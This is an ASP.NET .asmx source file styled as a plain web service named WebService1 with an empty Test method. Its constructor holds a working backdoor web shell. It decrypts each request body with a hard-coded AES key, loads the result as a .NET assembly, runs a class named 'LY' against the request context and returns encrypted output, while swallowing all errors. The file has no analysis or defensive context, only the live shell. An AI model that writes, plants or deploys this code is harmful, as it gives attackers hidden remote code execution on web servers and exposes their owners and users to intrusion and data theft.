<%@ WebService Language="C#" Class="WebService1" %>
public class WebService1 : System.Web.Services.WebService
{
    public WebService1() {
        try{string key = "3c6e0b8a9c15224a";byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(Context.Request.BinaryRead(Context.Request.ContentLength), 0, Context.Request.ContentLength);if (Context.Session["payload"] == null){ Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });}else{ object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); System.IO.MemoryStream outStream = new System.IO.MemoryStream();o.Equals(outStream);o.Equals(Context); o.Equals(data);o.ToString();byte[] r = outStream.ToArray();outStream.Dispose();Context.Response.BinaryWrite(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length));}}catch(System.Exception){}

    }

        [System.Web.Services.WebMethod(EnableSession = true)]
        public void Test()
        {

        }
    
}